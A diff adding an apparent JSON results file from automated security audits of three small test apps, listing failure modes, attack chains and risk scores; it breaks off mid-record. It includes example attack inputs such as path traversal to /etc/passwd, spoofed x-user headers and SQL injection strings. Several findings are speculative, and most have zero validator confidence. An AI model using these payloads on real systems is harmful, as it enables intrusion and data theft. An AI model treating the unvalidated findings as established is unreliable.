+              "failure_mode": "Cascading failure from S3 bucket compromise to application",
+              "trigger": "Attacker deletes or corrupts backup files in the public S3 bucket",
+              "evidence": "storage.tf:7 ('acl = \"public-read\"'), README.md:1-2 (implies backup storage is critical)",
+              "business_impact": "Prolonged downtime due to inability to recover from backups. Loss of customer data and trust. Operations staff unable to restore service. Financial losses from outage.",
+              "blast_radius": "Tier 1 (storage.tf, aws_s3_bucket.backups) \u2192 Tier 2 (main.py, requirements.txt) \u2192 Entire application stack",
+              "attack_chain": [
+                "Attacker exploits public-read S3 bucket (path:storage.tf:7) to modify/delete backups",
+                "Application (main.py) or deployment pipeline relies on backups for recovery",
+                "Backup corruption leads to failed deployments or data loss",
+                "Application enters degraded state (e.g., Flask service fails to start)"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Credential reuse attack via exposed API_KEY",
+              "trigger": "Extraction of API_KEY from any deployed container or leaked configuration",
+              "evidence": "config.env:1 ('API_KEY=...'), Dockerfile:22 ('COPY config.env /app/config.env')",
+              "business_impact": "Lateral movement to adjacent systems. Compromise of partner integrations. Financial fraud if API_KEY has payment capabilities. Business operations disrupted across multiple services.",
+              "blast_radius": "Tier 1 (config.env, API_KEY) \u2192 All systems using this API_KEY \u2192 External partner systems \u2192 Potential supply chain attack",
+              "attack_chain": [
+                "API_KEY is hardcoded in config.env (path:config.env:1) and copied into Docker image (path:Dockerfile:22)",
+                "Attacker extracts API_KEY from image or leaked logs",
+                "API_KEY is reused across multiple services (implied by Tier 1 classification)",
+                "Attacker uses API_KEY to access other internal systems or external partner APIs"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.184653,
+          "seconds": 173.2,
+          "llm_calls": 21
+        }
+      ]
+    },
+    "notes-express": {
+      "runs": [
+        {
+          "findings": [
+            {
+              "failure_mode": "Authentication Bypass via Unvalidated x-user Header",
+              "trigger": "Crafted HTTP request with a malicious x-user header (e.g., curl -H 'x-user: ann' http://target/notes/1).",
+              "evidence": "server.js:11-13 'return req.get(\"x-user\");', server.js:16 'if (!currentUser(req))', server.js:21 'if (!currentUser(req))'",
+              "business_impact": "Unauthorized access to all private notes and export files. All users' data is exposed, violating confidentiality. Operations staff may face compliance violations (e.g., GDPR).",
+              "blast_radius": "Tier 1 (NOTES store and /export endpoint). Lateral movement possible if exported files contain credentials or keys for adjacent systems.",
+              "attack_chain": [
+                "Attacker sends HTTP request with arbitrary x-user header (e.g., 'x-user: admin')",
+                "currentUser() (server.js:11-13) blindly trusts the header value without validation",
+                "All endpoints (e.g., /notes/:id, /export) grant access based on this spoofed identity"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.98
+            },
+            {
+              "failure_mode": "Arbitrary File Read via Path Traversal in /export",
+              "trigger": "HTTP GET request with a path traversal payload in the 'name' query parameter (e.g., /export?name=../../server.js).",
+              "evidence": "server.js:22-23 'const file = path.join(__dirname, \"exports\", req.query.name); res.send(fs.readFileSync(file, \"utf8\"))'",
+              "business_impact": "Sensitive system files (configs, credentials, logs) leaked. Attackers gain insights for further exploitation. Business reputation damaged due to data breach.",
+              "blast_radius": "Tier 1 (file system access). If exported files include secrets (e.g., .env), adjacent systems may be compromised.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=../../../etc/passwd",
+                "path.join() (server.js:22) concatenates user-controlled input (req.query.name) with __dirname/exports",
+                "fs.readFileSync() (server.js:23) reads the resolved path, exposing arbitrary files"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Unauthorized Note Access via Missing Owner Validation",
+              "trigger": "Authenticated request to /notes/:id with an ID not owned by the currentUser (e.g., /notes/1 with x-user: bob).",
+              "evidence": "server.js:15-18 'app.get(\"/notes/:id\", (req, res) => { if (!currentUser(req)) return res.status(401).end(); res.json(NOTES[req.params.id]); });'",
+              "business_impact": "All private notes are accessible to any authenticated user. Loss of confidentiality for all users. Potential legal liability for data exposure.",
+              "blast_radius": "Tier 1 (NOTES in-memory store). Direct impact on all users' private data.",
+              "attack_chain": [
+                "Attacker (e.g., 'bob') sends GET /notes/1 with x-user: bob header",
+                "/notes/:id endpoint (server.js:15-18) checks only for x-user presence, not ownership",
+                "Returns NOTES[1] (ann's private note) to bob without verifying owner match"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 7,
+              "rpn": 441,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via fs.readFileSync on Non-Existent File",
+              "trigger": "HTTP GET /export with a non-existent filename in the 'name' query parameter.",
+              "evidence": "server.js:23 'res.send(fs.readFileSync(file, \"utf8\"))'",
+              "business_impact": "Service outage for all users. Downtime affects business operations and customer trust. Requires manual restart.",
+              "blast_radius": "Tier 2 (Express app). Entire application becomes unavailable until restart.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=nonexistent.txt",
+                "fs.readFileSync() (server.js:23) throws an exception for missing file",
+                "Unhandled exception crashes the Node.js process (default Express behavior)"
+              ],
+              "severity": 7,
+              "occurrence": 6,
+              "detection": 6,
+              "rpn": 252,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "In-Memory Data Corruption via Concurrent Modifications",
+              "trigger": "High-frequency concurrent requests to endpoints accessing NOTES (e.g., automated fuzzing or load testing).",
+              "evidence": "server.js:6-9 'const NOTES = { ... }', server.js:17 'res.json(NOTES[req.params.id])'",
+              "business_impact": "Data integrity compromised. Users may see corrupted or inconsistent notes. Operational debugging becomes difficult.",
+              "blast_radius": "Tier 1 (NOTES store). Limited to in-memory data, but affects all users.",
+              "attack_chain": [
+                "Attacker (or legitimate user) sends rapid concurrent requests to /notes/:id or /export",
+                "NOTES object (server.js:6-9) is shared mutable state with no synchronization",
+                "Race condition allows partial writes or inconsistent reads (e.g., if NOTES were dynamically modified)"
+              ],
+              "severity": 6,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 270,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via Error Stack Traces",
+              "trigger": "Malformed input causing fs.readFileSync to fail (e.g., /export?name=../../).",
+              "evidence": "server.js:23 'res.send(fs.readFileSync(file, \"utf8\"))'",
+              "business_impact": "Attackers gain reconnaissance data (file paths, framework versions) to refine further attacks. Increases risk of targeted exploits.",
+              "blast_radius": "Tier 1 (file system access). Limited to information leakage, but aids in lateral movement.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=../../ (path traversal to a directory)",
+                "fs.readFileSync() (server.js:23) throws EISDIR (is a directory) error",
+                "Express returns raw error stack trace, leaking internal paths and code structure"
+              ],
+              "severity": 6,
+              "occurrence": 7,
+              "detection": 5,
+              "rpn": 210,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Privilege Escalation via Hardcoded NOTES Store",
+              "trigger": "Authenticated request to /notes/1 or /notes/2 with any x-user header (e.g., x-user: attacker).",
+              "evidence": "server.js:6-9 'const NOTES = { 1: { owner: \"ann\", ... }, 2: { owner: \"bob\", ... } }', server.js:17 'res.json(NOTES[req.params.id])'",
+              "business_impact": "Complete compromise of all private notes. No user isolation. Business faces regulatory penalties for inadequate access controls.",
+              "blast_radius": "Tier 1 (NOTES store). All user data exposed; no lateral movement but full data breach.",
+              "attack_chain": [
+                "Attacker exploits authentication bypass (x-user header) to access /notes/:id",
+                "NOTES store (server.js:6-9) is hardcoded with static user IDs (1, 2)",
+                "Attacker enumerates all note IDs (1, 2, etc.) to access all users' data without ownership checks"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.172178,
+          "seconds": 127.4,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "Arbitrary File Read via Path Traversal",
+              "trigger": "HTTP GET request to /export with a malicious path traversal payload in the 'name' query parameter (e.g., ../../../etc/passwd).",
+              "evidence": "server.js:20-24: 'app.get(\"/export\", (req, res) => { if (!currentUser(req)) return res.status(401).end(); const file = path.join(__dirname, \"exports\", req.query.name); res.send(fs.readFileSync(file, \"utf8\")); });'",
+              "business_impact": "Complete confidentiality breach: attacker can read any file accessible to the server process (configs, credentials, private keys, user data). Operations staff and business reputation are harmed.",
+              "blast_radius": "All files readable by the Node.js process on the server filesystem. Enables lateral movement if secrets (e.g., AWS keys) are exposed.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=../../../etc/passwd",
+                "path.join() (server.js:22) constructs file path using untrusted req.query.name",
+                "fs.readFileSync() (server.js:23) reads the file without validation",
+                "Server returns contents of arbitrary file"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Unauthorized Note Access (IDOR)",
+              "trigger": "HTTP GET request to /notes/:id with any ID (e.g., /notes/1) and any x-user header (or none, but 401 is bypassed if header is present).",
+              "evidence": "server.js:15-18: 'app.get(\"/notes/:id\", (req, res) => { if (!currentUser(req)) return res.status(401).end(); res.json(NOTES[req.params.id]); });', server.js:11-13: 'function currentUser(req) { return req.get(\"x-user\"); }'",
+              "business_impact": "All private notes are exposed to any unauthenticated or authenticated user. Customer privacy violated; business faces regulatory penalties (e.g., GDPR).",
+              "blast_radius": "All notes in the in-memory NOTES store (server.js:6-9). No authorization boundaries exist.",
+              "attack_chain": [
+                "Attacker sets x-user header to any value (e.g., 'attacker')",
+                "Attacker sends GET /notes/1 (or any ID)",
+                "currentUser() (server.js:11-13) extracts unvalidated x-user header",
+                "/notes/:id endpoint (server.js:15-18) returns NOTES[req.params.id] without ownership check",
+                "Server returns private note of another user (e.g., ann's note)"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Authentication Bypass via Spoofed Header",
+              "trigger": "Any HTTP request with a fabricated x-user header (e.g., curl -H 'x-user: admin' http://target/notes/1).",
+              "evidence": "server.js:11-13: 'function currentUser(req) { return req.get(\"x-user\"); }', server.js:16: 'if (!currentUser(req)) return res.status(401).end();'",
+              "business_impact": "Any user can impersonate any other user. Authentication is entirely broken. Enables full access to all notes and files.",
+              "blast_radius": "All endpoints relying on currentUser() (both /notes/:id and /export). Complete auth bypass.",
+              "attack_chain": [
+                "Attacker sends request with arbitrary x-user header (e.g., 'admin')",
+                "currentUser() (server.js:11-13) blindly returns the header value",
+                "Both /notes/:id and /export endpoints (server.js:15-24) treat the attacker as 'authenticated'",
+                "No validation of header integrity or existence"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via In-Memory Store Exhaustion",
+              "trigger": "High-volume requests to /notes/:id with non-existent or large IDs, or hypothetical memory exhaustion via unbounded NOTES growth.",
+              "evidence": "server.js:6-9: 'const NOTES = { 1: { owner: \"ann\", text: \"ann\\'s private note\" }, 2: { owner: \"bob\", text: \"bob\\'s private note\" } };', server.js:17: 'res.json(NOTES[req.params.id]);'",
+              "business_impact": "Service unavailability for all users. Operations staff must restart the server. Business reputation damaged due to downtime.",
+              "blast_radius": "Entire application (all endpoints) due to shared in-memory store and single process (server.js:5,26).",
+              "attack_chain": [
+                "Attacker sends rapid requests to /notes/:id with large or malformed IDs",
+                "NOTES object (server.js:6-9) is accessed directly without bounds checking",
+                "If NOTES grows unbounded (e.g., via hypothetical POST endpoint), memory exhaustion occurs",
+                "Express app (server.js:26) crashes or slows to a halt"
+              ],
+              "severity": 8,
+              "occurrence": 4,
+              "detection": 7,
+              "rpn": 224,
+              "priority": "High",
+              "validator_confidence": 0.7
+            },
+            {
+              "failure_mode": "Race Condition in File Read (TOCTOU)",
+              "trigger": "Concurrent requests to /export with a 'name' parameter pointing to a symlink that is rapidly swapped to target sensitive files.",
+              "evidence": "server.js:22-23: 'const file = path.join(__dirname, \"exports\", req.query.name); res.send(fs.readFileSync(file, \"utf8\"));'",
+              "business_impact": "Arbitrary file read (similar to path traversal) but via race condition. Confidentiality breach of sensitive files.",
+              "blast_radius": "Any file accessible to the Node.js process, depending on symlink manipulation. Limited to files the attacker can influence via symlinks.",
+              "attack_chain": [
+                "Attacker triggers concurrent requests to /export with symlink manipulation",
+                "path.join() (server.js:22) resolves the path at time T1",
+                "fs.readFileSync() (server.js:23) reads the file at time T2",
+                "If an attacker swaps the symlink between T1 and T2, the server reads an unintended file"
+              ],
+              "severity": 9,
+              "occurrence": 5,
+              "detection": 9,
+              "rpn": 405,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via Error Messages",
+              "trigger": "Request to /export with a non-existent file name in the 'name' query parameter.",
+              "evidence": "server.js:22-23: 'const file = path.join(__dirname, \"exports\", req.query.name); res.send(fs.readFileSync(file, \"utf8\"));'",
+              "business_impact": "Reconnaissance aid: attacker gains knowledge of filesystem layout, aiding further attacks. Minor but cumulative risk.",
+              "blast_radius": "Limited to error messages, but may expose paths (e.g., __dirname) or internal details.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=nonexistent.txt",
+                "fs.readFileSync() (server.js:23) throws an error (ENOENT)",
+                "Express defaults to sending the error stack trace or message",
+                "Attacker learns filesystem structure or internal paths"
+              ],
+              "severity": 4,
+              "occurrence": 7,
+              "detection": 6,
+              "rpn": 168,
+              "priority": "Medium",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "In-Memory Data Corruption via Prototype Pollution",
+              "trigger": "Request with a parameter like id=__proto__ or name=__proto__ if the app uses unsafe object merging (not directly in current code but plausible with middleware).",
+              "evidence": "server.js:17: 'res.json(NOTES[req.params.id]);' (indirect risk if params are processed unsafely upstream)",
+              "business_impact": "Application logic broken; unpredictable behavior. May lead to crashes, data corruption, or further exploits.",
+              "blast_radius": "All in-memory data and application state. Could affect other users or endpoints.",
+              "attack_chain": [
+                "Attacker sends a crafted request with a malicious 'id' or 'name' parameter containing __proto__",
+                "If NOTES or req.query is merged unsafely (hypothetical, but possible in Express with certain middleware)",
+                "Prototype of Object is polluted, affecting all subsequent operations",
+                "NOTES store (server.js:6-9) or other objects may be corrupted"
+              ],
+              "severity": 6,
+              "occurrence": 1,
+              "detection": 7,
+              "rpn": 42,
+              "priority": "Medium",
+              "validator_confidence": 0.7
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.175559,
+          "seconds": 113.7,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "Arbitrary File Read via Path Traversal",
+              "trigger": "Malicious input in req.query.name containing path traversal sequences (e.g., ../../../)",
+              "evidence": "server.js:22-23: path.join(__dirname, 'exports', req.query.name); res.send(fs.readFileSync(file, 'utf8'))",
+              "business_impact": "Full server filesystem exposure, including configuration files, credentials, and private keys. Direct harm to business confidentiality and compliance.",
+              "blast_radius": "All files readable by the Node.js process on the server filesystem. Enables lateral movement if secrets (e.g., AWS keys) are exposed.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=../../../etc/passwd",
+                "path.join() (server.js:22) concatenates user-controlled req.query.name without sanitization",
+                "fs.readFileSync() (server.js:23) reads the resolved path, exposing sensitive files"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 1.0
+            },
+            {
+              "failure_mode": "Unauthorized Note Access (IDOR)",
+              "trigger": "Crafted request with arbitrary x-user header and valid note ID (e.g., /notes/1 with x-user: bob)",
+              "evidence": "server.js:11-12,15-18: return req.get('x-user'); res.json(NOTES[req.params.id])",
+              "business_impact": "All private notes (Tier 1 data) are accessible to any unauthenticated user. Violates user privacy and trust.",
+              "blast_radius": "All notes in the in-memory store (NOTES). No persistence, but full data exposure while the server runs.",
+              "attack_chain": [
+                "Attacker sets x-user header to any value (e.g., 'ann')",
+                "currentUser() (server.js:11-12) blindly trusts the x-user header with no validation",
+                "Attacker sends GET /notes/1 to access ann's private note",
+                "Server returns NOTES[req.params.id] (server.js:17) without checking ownership"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "Authentication Bypass via Missing Header Validation",
+              "trigger": "Request without x-user header to /notes/:id or /export",
+              "evidence": "server.js:16,21: if (!currentUser(req)) return res.status(401).end()",
+              "business_impact": "Complete authentication bypass. All endpoints become publicly accessible, exposing notes and enabling file reads.",
+              "blast_radius": "All Tier 1 endpoints (/notes/:id, /export) and their associated data (notes, filesystem).",
+              "attack_chain": [
+                "Attacker omits x-user header entirely",
+                "currentUser() (server.js:11-12) returns undefined",
+                "Both /notes/:id and /export endpoints (server.js:16,21) only check for falsy currentUser(), which passes for undefined",
+                "Attacker gains access to endpoints without authentication"
+              ],
+              "severity": 10,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 560,
+              "priority": "Critical",
+              "validator_confidence": 0.9
+            },
+            {
+              "failure_mode": "In-Memory Data Loss (No Persistence)",
+              "trigger": "Any process termination (crash, restart, or kill signal).",
+              "evidence": "server.js:6-9: const NOTES = { ... }",
+              "business_impact": "Total data loss for all users. Business operations relying on note storage are disrupted. User trust eroded.",
+              "blast_radius": "All notes in NOTES (Tier 1 data). No recovery possible without backups.",
+              "attack_chain": [
+                "Server process crashes (e.g., OOM, SIGKILL, or unhandled exception)",
+                "In-memory NOTES store (server.js:6-9) is lost entirely",
+                "All user notes vanish permanently on restart"
+              ],
+              "severity": 9,
+              "occurrence": 5,
+              "detection": 5,
+              "rpn": 225,
+              "priority": "High",
+              "validator_confidence": 0.8
+            },
+            {
+              "failure_mode": "Denial of Service via Malformed File Path",
+              "trigger": "Request to /export with req.query.name pointing to an invalid or inaccessible file.",
+              "evidence": "server.js:22-23: path.join(...); fs.readFileSync(file, 'utf8')",
+              "business_impact": "Server crash takes down all endpoints (Tier 1 and Tier 2). Downtime for all users.",
+              "blast_radius": "Entire Express app (Tier 2) and all Tier 1 endpoints. Cascading failure if no process manager restarts the server.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=/dev/null or a non-existent path",
+                "path.join() (server.js:22) resolves to an invalid or unreadable path",
+                "fs.readFileSync() (server.js:23) throws an unhandled exception (ENOENT or EACCES)",
+                "Express app (server.js:26) crashes if no error handler is configured"
+              ],
+              "severity": 8,
+              "occurrence": 8,
+              "detection": 8,
+              "rpn": 512,
+              "priority": "Critical",
+              "validator_confidence": 0.9
+            },
+            {
+              "failure_mode": "Race Condition in Note Access (TOCTOU)",
+              "trigger": "High-frequency requests with fluctuating x-user headers to /notes/:id.",
+              "evidence": "server.js:15-18: app.get('/notes/:id', ...) with no ownership check",
+              "business_impact": "Inconsistent authorization. Attacker may access or leak notes belonging to other users intermittently.",
+              "blast_radius": "All notes in NOTES. Limited to concurrent request windows but enables privilege confusion.",
+              "attack_chain": [
+                "Attacker rapidly alternates between setting x-user header to 'ann' and 'bob'",
+                "currentUser() (server.js:11-12) checks the header at request time, but no session binding exists",
+                "If the server processes requests out of order (e.g., due to async I/O or load balancer delays), the attacker may access notes as the wrong user",
+                "NOTES[req.params.id] (server.js:17) is returned without revalidating ownership"
+              ],
+              "severity": 6,
+              "occurrence": 3,
+              "detection": 9,
+              "rpn": 162,
+              "priority": "Medium",
+              "validator_confidence": 0.7
+            },
+            {
+              "failure_mode": "Information Disclosure via Error Stack Traces",
+              "trigger": "Request to /export with a non-existent file path in req.query.name.",
+              "evidence": "server.js:23: fs.readFileSync(file, 'utf8')",
+              "business_impact": "Reveals server filesystem paths and internal directory structure, aiding further attacks (e.g., path traversal).",
+              "blast_radius": "Metadata leakage only. No direct data exposure, but enables reconnaissance for higher-impact attacks.",
+              "attack_chain": [
+                "Attacker sends GET /export?name=nonexistent.txt",
+                "fs.readFileSync() (server.js:23) throws an error (e.g., ENOENT)",
+                "Express defaults to sending raw error stack traces in development mode, leaking __dirname and filesystem structure"
+              ],
+              "severity": 7,
+              "occurrence": 7,
+              "detection": 6,
+              "rpn": 294,
+              "priority": "High",
+              "validator_confidence": 0.85
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.148349,
+          "seconds": 100.6,
+          "llm_calls": 14
+        }
+      ]
+    },
+    "shop-api": {
+      "runs": [
+        {
+          "findings": [
+            {
+              "failure_mode": "SQL Injection via /orders/search leading to full database dump",
+              "trigger": "Single HTTP GET request to /orders/search?q='%20OR%20'1'='1 with valid JWT (auth bypass not required for data exposure).",
+              "evidence": "app.py:32: f\"SELECT id, email, card_token, total FROM orders WHERE email LIKE '%{term}%'\"",
+              "business_impact": "Complete exposure of all customer emails and payment card tokens, violating PCI-DSS compliance. Customers face identity theft and fraud risk. Business faces regulatory fines and reputational damage.",
+              "blast_radius": "All customer records in shop.db (Tier 1) are exposed. No lateral movement, but data exfiltration enables follow-on attacks (e.g., phishing, card fraud).",
+              "attack_chain": [
+                "Attacker sends crafted GET request to /orders/search with q parameter containing SQL injection payload (e.g., ' OR '1'='1)",
+                "The f-string in app.py:32 directly interpolates user input into SQL query: f\"SELECT ... WHERE email LIKE '%{term}%'\"",
+                "SQLite executes the malformed query, returning all rows from orders table (including emails and card tokens)",
+                "Response contains sensitive customer PII and payment data"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "JWT Secret Compromise via config.py Exposure",
+              "trigger": "Exposure of config.py file (e.g., via GitHub commit, backup leak, or file system access).",
+              "evidence": "config.py:2: JWT_SECRET = \"[REDACTED:secret]\"",
+              "business_impact": "Complete authentication bypass. Attackers can impersonate any user, including staff, to issue unauthorized refunds, modify orders, or exfiltrate data. Business faces financial fraud and operational disruption.",
+              "blast_radius": "All JWT-based authentication (Tier 1) is compromised. Enables lateral movement to any endpoint relying on current_user().",
+              "attack_chain": [
+                "Attacker gains read access to config.py (e.g., via source code leak, misconfigured repo, or insider threat)",
+                "Extracts hardcoded JWT_SECRET from config.py:2",
+                "Uses secret to forge arbitrary JWT tokens for any user (including admin)",
+                "Bypasses current_user() validation (app.py:20) to access /admin/refund or other protected endpoints"
+              ],
+              "severity": 10,
+              "occurrence": 7,
+              "detection": 9,
+              "rpn": 630,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Unauthorized Refunds via Missing Input Validation",
+              "trigger": "Single crafted POST request to /admin/refund with JSON body: {\"amount\": 999999, \"order_id\": 1}.",
+              "evidence": "app.py:42-43: db().execute(\"UPDATE orders SET refunded = ? WHERE id = ?\", (body[\"amount\"], body[\"order_id\"]))",
+              "business_impact": "Financial fraud via unauthorized refunds. Business loses revenue; customers may have funds stolen or orders manipulated. Operational staff must manually reconcile fraudulent transactions.",
+              "blast_radius": "Direct financial impact on business and affected customers. No lateral movement, but repeated exploitation can drain funds.",
+              "attack_chain": [
+                "Attacker obtains valid JWT (e.g., via stolen token or forged token from JWT_SECRET leak)",
+                "Sends POST request to /admin/refund with arbitrary body['amount'] and body['order_id']",
+                "No validation on body['amount'] (app.py:43) allows negative values or excessive amounts",
+                "No validation on body['order_id'] allows targeting any order (including others' orders)",
+                "Database updates order with attacker-controlled values (app.py:42-44)"
+              ],
+              "severity": 9,
+              "occurrence": 8,
+              "detection": 7,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Information Disclosure via Stack Trace in Error Handler",
+              "trigger": "Any request causing an unhandled exception (e.g., /orders/search?q=' OR 1=1--).",
+              "evidence": "app.py:51-52: return jsonify(error=str(exc), trace=traceback.format_exc()), 500",
+              "business_impact": "Exposure of internal system details aids further attacks (e.g., path disclosure, secret locations). Reduces attacker's reconnaissance effort. Business faces increased risk of targeted exploits.",
+              "blast_radius": "Limited to information leakage. No direct data modification, but enables more severe attacks (e.g., SQLi, secret extraction).",
+              "attack_chain": [
+                "Attacker sends malformed request (e.g., invalid JSON, SQL syntax error via injection)",
+                "Flask raises an exception, triggering @app.errorhandler (app.py:49)",
+                "Error handler returns full stack trace (app.py:51-52) including internal paths, secrets, or query details",
+                "Attacker extracts sensitive data (e.g., DB_PATH, JWT_SECRET references, or query structures) from trace"
+              ],
+              "severity": 7,
+              "occurrence": 8,
+              "detection": 6,
+              "rpn": 336,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Race Condition in Refund Processing (Double Refund)",
+              "trigger": "Rapid, concurrent POST requests to /admin/refund with same order_id and high amount values.",
+              "evidence": "app.py:42-44: db().execute(\"UPDATE orders SET refunded = ? WHERE id = ?\", (body[\"amount\"], body[\"order_id\"])); db().commit()",
+              "business_impact": "Financial loss due to double refunds. Business overpays customers, leading to accounting discrepancies and fraud. Operational staff must manually detect and reverse fraudulent transactions.",
+              "blast_radius": "Direct financial impact on business. No data corruption, but repeated exploitation can escalate losses.",
+              "attack_chain": [
+                "Attacker with valid JWT sends concurrent POST requests to /admin/refund for the same order_id",
+                "Each request reads the current order state (not explicitly locked) and updates refunded amount",
+                "SQLite's default isolation level (SERIALIZABLE) may not prevent TOCTOU if transactions are not atomic",
+                "Multiple refunds are processed for the same order, exceeding the original amount"
+              ],
+              "severity": 8,
+              "occurrence": 6,
+              "detection": 9,
+              "rpn": 432,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Denial of Service via SQLite Database Locking",
+              "trigger": "High-volume requests to /orders/search with computationally expensive queries (e.g., q=%25).",
+              "evidence": "app.py:31-33: db().execute(f\"SELECT ... WHERE email LIKE '%{term}%'\"); app.py:42-44: db().execute(\"UPDATE ...\")",
+              "business_impact": "Service unavailability for all endpoints (Tier 1). Customers cannot search orders; staff cannot process refunds. Business faces lost sales and operational downtime.",
+              "blast_radius": "All Tier 1 components (app.py, /orders/search, /admin/refund, db()) are affected. No data loss, but full outage.",
+              "attack_chain": [
+                "Attacker sends rapid, long-running queries to /orders/search (e.g., with complex LIKE patterns)",
+                "SQLite locks the database (shop.db) for writes during query execution (app.py:31-33)",
+                "/admin/refund requests (app.py:42-44) are blocked waiting for the lock",
+                "Flask app threads pile up, exhausting resources and causing timeouts or crashes"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 5,
+              "rpn": 315,
+              "priority": "High",
+              "validator_confidence": 0.0
+            },
+            {
+              "failure_mode": "Privilege Escalation via JWT Algorithm Confusion",
+              "trigger": "Single HTTP request with Authorization header: Bearer <none-alg JWT>.",
+              "evidence": "app.py:20: jwt.decode(token, JWT_SECRET, algorithms=[\"HS256\"])",
+              "business_impact": "Unauthorized access to admin endpoints. Attacker can issue refunds, modify orders, or exfiltrate data. Business faces financial and reputational damage.",
+              "blast_radius": "All endpoints relying on current_user() (Tier 1) are vulnerable. Enables lateral movement to sensitive operations.",
+              "attack_chain": [
+                "Attacker crafts a JWT with header {\"alg\": \"none\"} and arbitrary claims (e.g., {\"role\": \"admin\"})",
+                "Sends request to any protected endpoint (e.g., /admin/refund) with the token",
+                "current_user() (app.py:20) uses jwt.decode() with algorithms=[\"HS256\"], but PyJWT may accept \"none\" if not explicitly rejected",
+                "Token is accepted as valid, granting attacker admin privileges"
+              ],
+              "severity": 9,
+              "occurrence": 7,
+              "detection": 8,
+              "rpn": 504,
+              "priority": "Critical",
+              "validator_confidence": 0.0
+            }
+          ],
+          "error": null,
+          "cost_usd": 0.181627,
+          "seconds": 117.3,
+          "llm_calls": 21
+        },
+        {
+          "findings": [
+            {
+              "failure_mode": "SQL Injection via /orders/search leading to full DB exfiltration",
+              "trigger": "A single HTTP GET request to /orders/search with a maliciously crafted 'q' query parameter (e.g., /orders/search?q=' OR 1=1 --).",
+              "evidence": "path:app.py:32: f\"SELECT id, email, card_token, total FROM orders WHERE email LIKE '%{term}%'\"",
+              "business_impact": "Complete compromise of customer PII and payment data (card tokens), violating PCI-DSS compliance. Customers face identity theft and financial fraud. Business faces regulatory fines, reputational damage, and loss of trust.",
+              "blast_radius": "All customer records in the SQLite database (shop.db) are exposed. No lateral movement, but data exfiltration is total for Tier 1 data.",
+              "attack_chain": [
+                "Attacker sends crafted GET request to /orders/search with q parameter containing SQL injection payload (e.g., ' OR '1'='1)",
+                "The payload is directly interpolated into the SQL query at path:app.py:32",
+                "The malicious query executes, bypassing the LIKE filter and returning all rows from the orders table",
+                "Sensitive data (email, card_token, total) for all customers is returned in the JSON response"
+              ],
+              "severity": 10,
+              "occurrence": 9,
+              "detection": 8,
+              "rpn": 720,
+              "priority": "Critical",
+              "validator_confidence": 0.95
+            },
+            {
+              "failure_mode": "JWT Secret Compromise leading to full authentication bypass",
+              "trigger": "Exposure of JWT_SECRET (e.g., config.py in version control, hardcoded in deployment artifacts, or leaked via logs).",
+              "evidence": "path:config.py:2: JWT_SECRET = \"[REDACTED:secret]\"; path:app.py:20: jwt.decode(token, JWT_SECRET, algorithms=[\"HS256\"])",
